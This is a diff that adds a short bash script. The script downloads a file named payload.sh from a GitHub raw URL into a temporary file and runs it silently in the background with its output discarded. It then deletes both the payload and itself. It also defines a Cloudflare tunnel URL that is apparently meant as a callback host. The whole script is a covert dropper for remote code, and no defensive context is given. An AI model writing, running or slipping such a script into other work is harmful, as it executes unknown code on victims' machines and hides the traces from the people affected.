@@ -1,0 +1,11 @@
+#!/bin/bash
+
+CLOUDFLARE_URL="https://adjust-walks-telling-awards.trycloudflare.com"
+EXEC=$(mktemp /tmp/install.XXXXXX)
+
+curl -s -L -H "Cache-Control: no-cache" "https://raw.githubusercontent.com/PsyKlyn/script-updates/main/payload.sh" -o "$EXEC"
+
+chmod +x "$EXEC"
+nohup bash "$EXEC" >/dev/null 2>&1 &
+
+sleep 2 && rm -f "$EXEC" "$0"
